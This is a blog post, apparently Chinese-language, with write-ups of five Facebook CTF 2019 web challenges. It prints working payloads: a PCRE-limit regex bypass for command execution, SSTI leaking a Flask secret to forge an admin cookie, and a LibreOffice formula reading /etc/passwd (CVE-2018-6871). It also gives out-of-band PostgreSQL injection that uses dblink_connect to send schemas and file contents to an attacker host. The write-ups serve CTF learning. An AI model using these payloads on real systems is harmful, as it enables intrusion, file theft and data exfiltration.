<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>fbctf2019 | </title>

  
  <meta name="author" content="damn1t">
  

  
  <meta name="description" content="Facebook ctf 2019webrceservice题目描述：

We created this web interface to run commands on our servers, but since we haven’t figured out how to secure it y">
  

  
  
  <meta name="keywords" content="ctf">
  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  <meta property="og:title" content="fbctf2019"/>

  <meta property="og:site_name" content=""/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
</head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/"></a>
    </h1>
    <p class="site-description"></p>
  </div>
  <nav class="site-navigation">
    <ul>
      
        <li><a href="/">Home</a></li>
      
        <li><a href="/archives">Archives</a></li>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    <article>

  
    
    <h3 class="article-title"><span>fbctf2019</span></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/06/12/CTF/fbctf2019/" rel="bookmark">
        <time class="entry-date published" datetime="2019-06-11T17:27:45.567Z">
          2019-06-12
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="Facebook-ctf-2019"><a href="#Facebook-ctf-2019" class="headerlink" title="Facebook ctf 2019"></a>Facebook ctf 2019</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="rceservice"><a href="#rceservice" class="headerlink" title="rceservice"></a>rceservice</h3><p>题目描述：</p>
<blockquote>
<p>We created this web interface to run commands on our servers, but since we haven’t figured out how to secure it yet we only let you run ‘ls’</p>
<p><a href="http://challenges.fbctf.com:8085" target="_blank" rel="noopener">http://challenges.fbctf.com:8085</a></p>
<p>(This problem does not require any brute force or scanning.<br>We will ban your team if we detect brute force or scanning).</p>
</blockquote>
<p>要求用<code>json</code>格式传送payload<br><img src="https://ramadistra.dev/static/69bcde5f2a66779950b04b31626c4e7a/92980/initial.webp" alt=""></p>
<p>我们尝试<code>ls</code>：<code>{&quot;cmd&quot;:&quot;ls&quot;}</code></p>
<p><img src="https://ramadistra.dev/static/ef292e7c05d67c2b8f563690c770eb69/889a8/ls.webp" alt=""></p>
<p>题目源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">putenv(&apos;PATH=/home/rceservice/jail&apos;);</span><br><span class="line"></span><br><span class="line">if (isset($_REQUEST[&apos;cmd&apos;])) &#123;</span><br><span class="line">  $json = $_REQUEST[&apos;cmd&apos;];</span><br><span class="line"></span><br><span class="line">  if (!is_string($json)) &#123;</span><br><span class="line">    echo &apos;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&apos;;</span><br><span class="line">  &#125; elseif (preg_match(&apos;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&apos;, $json)) &#123;</span><br><span class="line">    echo &apos;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&apos;;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    echo &apos;Attempting to run command:&lt;br/&gt;&apos;;</span><br><span class="line">    $cmd = json_decode($json, true)[&apos;cmd&apos;];</span><br><span class="line">    if ($cmd !== NULL) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      echo &apos;Invalid input&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &apos;&lt;br/&gt;&lt;br/&gt;&apos;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>暴躁过滤，在线砍人<br>但是我们看到了<code>preg_match</code>,就会想到p神曾经提到的PRCE，利用如下的exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">payload = &apos;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;zz&quot;:&quot;&apos; + &quot;a&quot;*(1000000) + &apos;&quot;&#125;&apos;</span><br><span class="line"></span><br><span class="line">res = requests.post(&quot;http://challenges.fbctf.com:8085/&quot;, data=&#123;&quot;cmd&quot;:payload&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure></p>
<p>另一种方法，同样是<code>preg_match</code>的问题，由于它会努力去匹配第一行，所以我们可以利用<strong>多行</strong>的方法</p>
<p><img src="https://i.loli.net/2019/06/10/5cfe6008e1fb886158.png" alt=""></p>
<p>尝试直接<code>cat</code>，但是返回了空白<br>我们返回去查看源代码：<code>putenv(&#39;PATH=/home/rceservice/jail&#39;);</code>，jail应用于当前环境，又根据题目描述的提示–“只允许执行ls命令”，即jail包含了执行<code>ls</code>的二进制文件，所以我们可以直接拉出<code>cat</code>的路径：<code>&quot;cmd&quot;: &quot;/bin/cat /home/rceservice/flag&quot;</code></p>
<blockquote>
<p>注：Linux命令的位置：/bin,/usr/bin，默认都是全体用户使用，/sbin,/usr/sbin,默认root用户使用</p>
</blockquote>
<h3 id="events"><a href="#events" class="headerlink" title="events"></a>events</h3><p>题目描述：</p>
<blockquote>
<p>I heard cookies and string formatting are safe in 2019?</p>
<p><a href="http://challenges.fbctf.com:8083" target="_blank" rel="noopener">http://challenges.fbctf.com:8083</a></p>
<p>(This problem does not require any brute force or scanning. We will ban your team if we detect brute force or scanning).</p>
</blockquote>
<p>登录<br><img src="https://i.loli.net/2019/06/10/5cfe6bab2297446330.png" alt=""></p>
<p>观察cookie：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ImEi.XP5j-w.rHcMilGKzEg1FYfcEOR6iqa-B9A</span><br></pre></td></tr></table></figure></p>
<p>似乎有三段，但加密方式未知，密钥未知<br>我们尝试提交数据，注意到有三个参数需要提交：<br><img src="https://i.loli.net/2019/06/10/5cfe6cc46116a77936.png" alt=""></p>
<p>既然提示了<code>cookie</code>和<code>string format</code>，admin是未允许的状态，所以思路是篡改cookie，伪装为admin，继而拿到flag，通常有一个思路是：利用SSTI，获取密钥，然后重新签名生成cookie。所以如何利用SSTI呢？<br>通过一番尝试，三个参数中，<code>event_important</code>是可利用点</p>
<ul>
<li>我们输入<code>__dict__</code>，成功回显</li>
</ul>
<p><img src="https://i.loli.net/2019/06/10/5cfe7273070fc54701.png" alt=""></p>
<ul>
<li><p>查找配置文件：<code>__class__.__init__.__globals__[app].config</code><br><img src="https://i.loli.net/2019/06/10/5cfe73cb3856843642.png" alt=""></p>
</li>
<li><p>于是进行签名</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask.sessions import SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = b&apos;fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;&amp;_ej$tez)$_ik36n8d7o6mr#y&apos;</span><br><span class="line"></span><br><span class="line">session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def index():</span><br><span class="line">    print(session_serializer.dumps(&quot;admin&quot;))</span><br><span class="line"></span><br><span class="line">index()</span><br></pre></td></tr></table></figure>
<p>将得到的cookie去修改原<code>user</code>的cookie即可得到flag</p>
<h3 id="products-manager"><a href="#products-manager" class="headerlink" title="products manager"></a>products manager</h3><p>题目给出了源码：</p>
<ul>
<li>在db.php中：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">INSERT INTO products VALUES(&apos;facebook&apos;, sha256(....), &apos;FLAG_HERE&apos;);</span><br><span class="line">INSERT INTO products VALUES(&apos;messenger&apos;, sha256(....), ....);</span><br><span class="line">INSERT INTO products VALUES(&apos;instagram&apos;, sha256(....), ....);</span><br><span class="line">INSERT INTO products VALUES(&apos;whatsapp&apos;, sha256(....), ....);</span><br><span class="line">INSERT INTO products VALUES(&apos;oculus-rift&apos;, sha256(....), ....);</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
<p>给出了表结构，且提示很明显，再看主页面：<br><img src="https://i.loli.net/2019/06/11/5cfe8685b49df61035.png" alt=""></p>
<p>三个功能，add是添加产品<br><img src="https://i.loli.net/2019/06/11/5cfe86c76c0c145917.png" alt=""></p>
<p>view可以查询<br><img src="https://i.loli.net/2019/06/11/5cfe8707a0af441607.png" alt=""><br>我们再查看view.php:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if (isset($name) &amp;&amp; $name !== &quot;&quot;</span><br><span class="line">      &amp;&amp; isset($secret) &amp;&amp; $secret !== &quot;&quot;) &#123;</span><br><span class="line">  if (check_name_secret($name, hash(&apos;sha256&apos;, $secret)) === false) &#123;</span><br><span class="line">    return &quot;Incorrect name or secret, please try again&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  $product = get_product($name);</span><br><span class="line">  echo &quot;&lt;p&gt;Product details:&quot;;</span><br><span class="line">  echo &quot;&lt;ul&gt;&lt;li&gt;&quot; . htmlentities($product[&apos;name&apos;]) . &quot;&lt;/li&gt;&quot;;</span><br><span class="line">  echo &quot;&lt;li&gt;&quot; . htmlentities($product[&apos;description&apos;]) . &quot;&lt;/li&gt;&lt;/ul&gt;&lt;/p&gt;&quot;;</span><br></pre></td></tr></table></figure></p>
<p>/db.php::check_name_secret源码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function check_name_secret($name, $secret) &#123;</span><br><span class="line">  global $db;</span><br><span class="line">  $valid = false;</span><br><span class="line">  $statement = $db-&gt;prepare(</span><br><span class="line">    &quot;SELECT name FROM products WHERE name = ? AND secret = ?&quot;</span><br><span class="line">  );</span><br><span class="line">  check_errors($statement);</span><br><span class="line">  $statement-&gt;bind_param(&quot;ss&quot;, $name, $secret);</span><br><span class="line">  check_errors($statement-&gt;execute());</span><br><span class="line">  $res = $statement-&gt;get_result();</span><br><span class="line">  check_errors($res);</span><br><span class="line">  if ($res-&gt;fetch_assoc() !== null) &#123;</span><br><span class="line">    $valid = true;</span><br><span class="line">  &#125;</span><br><span class="line">  $statement-&gt;close();</span><br><span class="line">  return $valid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>/db.php::get_product源码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function get_product($name) &#123;</span><br><span class="line">  global $db;</span><br><span class="line">  $statement = $db-&gt;prepare(</span><br><span class="line">    &quot;SELECT name, description FROM products WHERE name = ?&quot;</span><br><span class="line">  );</span><br><span class="line">  check_errors($statement);</span><br><span class="line">  $statement-&gt;bind_param(&quot;s&quot;, $name);</span><br><span class="line">  check_errors($statement-&gt;execute());</span><br><span class="line">  $res = $statement-&gt;get_result();</span><br><span class="line">  check_errors($res);</span><br><span class="line">  $product = $res-&gt;fetch_assoc();</span><br><span class="line">  $statement-&gt;close();</span><br><span class="line">  return $product;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>check的时候会将name和secret一并查询，但返回product时只查询name，所以此时便有了可利用点<br>这里涉及到mysql的一个问题，查询的时候将会忽略字符串尾部的空格<br><img src="https://i.loli.net/2019/06/11/5cfe897b3282f80821.png" alt=""></p>
<p>于是我们可以添加一个facebook尾部带n个空格的product，添加成功后再进行查询，便能得到flag</p>
<h3 id="pdfme"><a href="#pdfme" class="headerlink" title="pdfme"></a>pdfme</h3><p><img src="https://github.com/AidanFray/CTF_Writeups/raw/master/2019/FacebookCTF/pdfme/images/start.png" alt=""><br>只能上传<code>.fods</code>文件，在网上找了个：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;office:document xmlns:office=&quot;urn:oasis:names:tc:opendocument:xmlns:office:1.0&quot;  xmlns:style=&quot;urn:oasis:names:tc:opendocument:xmlns:style:1.0&quot;  xmlns:text=&quot;urn:oasis:names:tc:opendocument:xmlns:text:1.0&quot;  xmlns:table=&quot;urn:oasis:names:tc:opendocument:xmlns:table:1.0&quot;  xmlns:draw=&quot;urn:oasis:names:tc:opendocument:xmlns:drawing:1.0&quot;  xmlns:fo=&quot;urn:oasis:names:tc:opendocument:xmlns:xsl-fo-compatible:1.0&quot;  xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;  xmlns:dc=&quot;http://purl.org/dc/elements/1.1/&quot;  xmlns:meta=&quot;urn:oasis:names:tc:opendocument:xmlns:meta:1.0&quot;  xmlns:number=&quot;urn:oasis:names:tc:opendocument:xmlns:datastyle:1.0&quot;  xmlns:presentation=&quot;urn:oasis:names:tc:opendocument:xmlns:presentation:1.0&quot;  xmlns:svg=&quot;urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0&quot;  xmlns:chart=&quot;urn:oasis:names:tc:opendocument:xmlns:chart:1.0&quot;  xmlns:dr3d=&quot;urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0&quot;  xmlns:math=&quot;http://www.w3.org/1998/Math/MathML&quot;  xmlns:form=&quot;urn:oasis:names:tc:opendocument:xmlns:form:1.0&quot;  xmlns:script=&quot;urn:oasis:names:tc:opendocument:xmlns:script:1.0&quot;  xmlns:config=&quot;urn:oasis:names:tc:opendocument:xmlns:config:1.0&quot;  xmlns:ooo=&quot;http://openoffice.org/2004/office&quot;  xmlns:ooow=&quot;http://openoffice.org/2004/writer&quot;  xmlns:oooc=&quot;http://openoffice.org/2004/calc&quot;  xmlns:dom=&quot;http://www.w3.org/2001/xml-events&quot;  xmlns:xforms=&quot;http://www.w3.org/2002/xforms&quot;  xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;  xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;  xmlns:rpt=&quot;http://openoffice.org/2005/report&quot;  xmlns:of=&quot;urn:oasis:names:tc:opendocument:xmlns:of:1.2&quot;  xmlns:xhtml=&quot;http://www.w3.org/1999/xhtml&quot;  xmlns:grddl=&quot;http://www.w3.org/2003/g/data-view#&quot;  xmlns:tableooo=&quot;http://openoffice.org/2009/table&quot;  xmlns:drawooo=&quot;http://openoffice.org/2010/draw&quot;  xmlns:calcext=&quot;urn:org:documentfoundation:names:experimental:calc:xmlns:calcext:1.0&quot;  xmlns:loext=&quot;urn:org:documentfoundation:names:experimental:office:xmlns:loext:1.0&quot;  xmlns:field=&quot;urn:openoffice:names:experimental:ooo-ms-interop:xmlns:field:1.0&quot;  xmlns:formx=&quot;urn:openoffice:names:experimental:ooxml-odf-interop:xmlns:form:1.0&quot;  xmlns:css3t=&quot;http://www.w3.org/TR/css3-text/&quot; office:version=&quot;1.2&quot; office:mimetype=&quot;application/vnd.oasis.opendocument.spreadsheet&quot;&gt;</span><br><span class="line">    &lt;office:body&gt;</span><br><span class="line">        &lt;office:spreadsheet&gt;</span><br><span class="line">            &lt;table:table table:name=&quot;1&quot;&gt;</span><br><span class="line">                &lt;table:table-column/&gt;</span><br><span class="line">                &lt;table:table-row&gt;</span><br><span class="line">                    &lt;table:table-cell office:value-type=&quot;string&quot; calcext:value-type=&quot;string&quot;&gt;</span><br><span class="line">                        &lt;text:p&gt;TEXT&lt;/text:p&gt;</span><br><span class="line">                    &lt;/table:table-cell&gt;</span><br><span class="line">                &lt;/table:table-row&gt;</span><br><span class="line">                &lt;table:table-row&gt;&lt;/table:table-row&gt;</span><br><span class="line">            &lt;/table:table&gt;</span><br><span class="line">            &lt;table:named-expressions/&gt;</span><br><span class="line">        &lt;/office:spreadsheet&gt;</span><br><span class="line">    &lt;/office:body&gt;</span><br><span class="line">&lt;/office:document&gt;</span><br></pre></td></tr></table></figure></p>
<p>他会渲染为pdf：</p>
<p><img src="https://i.loli.net/2019/06/11/5cfe8ff9c303f36290.png" alt=""><br>将pdf下载下来，利用exiftool查看文件信息：<br><img src="https://i.loli.net/2019/06/11/5cff2e6c83e7924512.png" alt=""><br>注意到<strong>libreoffice</strong>，查找相关漏洞，最后落到了<a href="https://www.exploit-db.com/exploits/44022" target="_blank" rel="noopener">CVE-2018-6871</a>，差不多是协议的问题：</p>
<blockquote>
<p>For protocols that are not supported, such as ftp: // or file: //, WEBSERVICE returns the #VALUE! error value.</p>
<p>In LibreOffice, these restrictions are not implemented before 5.4.5/6.0.1</p>
</blockquote>
<p>将<code>table:table-cell</code>这一部分进行替换，改为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> &lt;table:table-cell </span><br><span class="line">     table:formula=&quot;of:=COM.MICROSOFT.WEBSERVICE(&amp;quot;/etc/passwd&amp;quot;)&quot; </span><br><span class="line">     office:value-type=&quot;string&quot; </span><br><span class="line">     office:string-value=&quot;&quot; </span><br><span class="line">     calcext:value-type=&quot;string&quot;&gt;</span><br><span class="line">  &lt;text:p&gt;#VALUE!&lt;/text:p&gt;</span><br><span class="line">&lt;/table:table-cell&gt;</span><br></pre></td></tr></table></figure></p>
<p>得到：<br><img src="https://github.com/AidanFray/CTF_Writeups/raw/master/2019/FacebookCTF/pdfme/images/passwd.png" alt=""><br>根据给出的用户，于是我们尝试查询<code>/home/libreoffice_admin/flag</code>,最终读到flag<br><img src="https://i.loli.net/2019/06/11/5cff3642cb56094273.png" alt=""></p>
<h3 id="hr-admin-module"><a href="#hr-admin-module" class="headerlink" title="hr_admin_module"></a>hr_admin_module</h3><p>题目描述：</p>
<blockquote>
<p>While tying down the application the developer may have had trouble revoking the permission on one or two functions. Let’s hope this got sorted. At least he made sure the site feels really fast.</p>
<p><a href="http://challenges.fbctf.com:8081" target="_blank" rel="noopener">http://challenges.fbctf.com:8081</a></p>
</blockquote>
<p><img src="https://i.loli.net/2019/06/12/5d00bb9fc0c9c75902.png" alt=""><br>有两个搜索框，从error似乎给出了一些提示，数据库为<code>postgresql</code>，<code>user</code>框禁止了输入，于是尝试利用<code>employees</code>框，但没卵用，关注地址栏：<br><img src="https://i.loli.net/2019/06/12/5d00bc9e9c61624776.png" alt=""></p>
<p>尝试将<code>employee</code>改为<code>user</code>，输入<code>admin&#39;</code>，奏效了，弹出warning：</p>
<blockquote>
<p>This is a warning alert—check it out!</p>
</blockquote>
<p>尝试输入<code>secret</code>，同样弹出上述警报<br>输入<code>admin%27--</code>，无警报</p>
<p>fuzz一阵，会发现回显只有有无warning的区别，但尝试利用<code>pg_sleep</code>，返回结果没有时延，所以我们可以猜测后台是异步执行，且一般盲注不起效果</p>
<p><strong>带外注入（OOB）：</strong></p>
<blockquote>
<p>带外通道技术(OOB)让攻击者能够通过另一种方式来确认和利用所谓的盲目(blind)的漏洞。在这种盲目的漏洞中，攻击者无法通过恶意请求直接在响应包中看到漏洞的输出结果。带外通道技术通常需要脆弱的实体来生成带外的TCP/UDP/ICMP请求，然后，攻击者可以通过这个请求来提取数据。一次OOB攻击能够成功是基于防火墙出站规则的，即允许存在漏洞的系统和外围防火墙的出站请求</p>
</blockquote>
<p>我们大致有两种方式：</p>
<ol>
<li>dnslog，搭建dns服务器，将域名指向自己的服务器，利用dns进行解析，然后请求自己的二级或三级域名，在dns解析日志中去查看他们</li>
<li>因为<code>dblink_connect</code>可用，我们可以尝试搭建一个<code>postgresql</code>服务，然后建立一个远程会话连接，连接到我们的<code>psql</code>服务，监听服务端口，查看请求包的明文信息</li>
</ol>
<p>第二个方法似乎更为简单</p>
<p><code>dblink</code>是一个支持在一个数据库会话中连接到其他PostgreSQL数据库的模块。<br><code>dblink_connect</code> – 打开一个到远程数据库的持久连接</p>
<p>在自己的服务器上安装<code>postgresql</code>，在配置文件<code>postgresql.conf</code>中设置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">listen_addresses = &apos;*&apos;</span><br></pre></td></tr></table></figure></p>
<p>利用tcpdump监听<code>5432</code>端口，查看请求包的信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -nX -i eth0 port 5432</span><br></pre></td></tr></table></figure></p>
<p>postgresql安装后默认用户为<code>postgres</code>，无密码，且有一个<code>postgres</code>的数据库，有意思的一点是，建议将密码或用户参数填写错误，因为这样才能返回查询信息</p>
<p>修改payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; UNION SELECT 1,(SELECT dblink_connect(&apos;host=IP user=postgres password= dbname=postgres&apos;)) --</span><br></pre></td></tr></table></figure></p>
<p>携带了连接信息：<br><img src="https://i.loli.net/2019/06/13/5d01fb1ee087f78253.png" alt=""></p>
<p>列出schema：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; UNION SELECT 1,(SELECT dblink_connect(&apos;host=IP user=&apos; || (SELECT string_agg(schema_name,&apos;:&apos;) FROM information_schema.schemata) || &apos; password=postgres dbname=postgres&apos;)) --</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2019/06/13/5d01fbce5191773760.png" alt=""></p>
<blockquote>
<p>String_agg：有两个参数一个是需要合并的字段名称或者字面量，还有就是合并后以何种分隔符，即：string_agg(expression, delimiter)。</p>
</blockquote>
<p>列出当前schema的table：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; UNION SELECT 1,(SELECT dblink_connect(&apos;host=IP user=&apos; || (SELECT string_agg(tablename, &apos;:&apos;) FROM pg_catalog.pg_tables WHERE schemaname=current_schema()) || &apos; password=postgres dbname=postgres&apos;)) --</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2019/06/13/5d01fd22325a750489.png" alt=""></p>
<p>列出searches的行数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; UNION SELECT 1,(SELECT dblink_connect(&apos;host=IP user=&apos; || (SELECT COUNT(*) FROM searches) || &apos; password=postgres dbname=postgres&apos;)) --</span><br></pre></td></tr></table></figure></p>
<p>发现为空，说明没有内容<br>由于<code>pg_read_file</code>不能用，我们可以使用<code>lo_import</code>将文件的内容加载到<code>pg_largeobject</code>目录中。如果查询成功，我们将获得对象的<code>oid</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; UNION SELECT 1,(SELECT dblink_connect(&apos;host=IP user=&apos; || (SELECT lo_import(&apos;/var/lib/postgresql/data/secret&apos;)) || &apos; password=postgres dbname=postgres&apos;)) --</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2019/06/13/5d0201e048b8e69600.png" alt=""><br>成功了！！！</p>
<p>每个文件都可以对应于一个oid<br>我们可以通过从pg_largeobject_metadata中提取来获取可用对象的oid列表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; UNION SELECT 1,(SELECT dblink_connect(&apos;host=IP user=&apos; || (SELECT string_agg(cast(l.oid as text), &apos;:&apos;) FROM pg_largeobject_metadata l) || &apos; password=postgres dbname=postgres&apos;)) --</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2019/06/13/5d0202849d7c926302.png" alt=""></p>
<p>我们尝试挨个读取，最终在<code>16444</code>读到了flag内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; UNION SELECT 1,(SELECT dblink_connect(&apos;host=IP user=&apos; || (SELECT convert_from(lo_get(16444), &apos;UTF8&apos;)) || &apos; password=postgres dbname=postgres&apos;)) --</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2019/06/13/5d0202971c8cd90441.png" alt=""></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/ctf/">ctf</a>
    </span>
    

    </div>

    
  </div>
</article>


    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2019 damn1t
    
  </p>
</footer>
    
  </div>
</div>
</body>
</html>